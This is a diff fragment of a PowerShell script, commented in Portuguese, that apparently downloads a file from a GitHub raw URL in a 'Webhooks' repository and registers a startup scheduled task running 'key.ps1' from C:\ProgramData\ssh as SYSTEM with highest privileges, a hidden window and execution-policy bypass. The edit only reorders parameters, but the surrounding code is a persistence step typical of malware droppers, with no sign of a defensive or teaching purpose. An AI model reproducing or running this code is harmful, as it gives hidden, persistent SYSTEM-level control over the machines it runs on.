@@ -4,7 +4,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks
 # Cria uma tarefa agendada para iniciar o script como SYSTEM na inicialização com privilégios mais altos
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass -File C:\ProgramData\ssh\key.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession
 
 # Definir a tarefa para usar privilégios mais altos
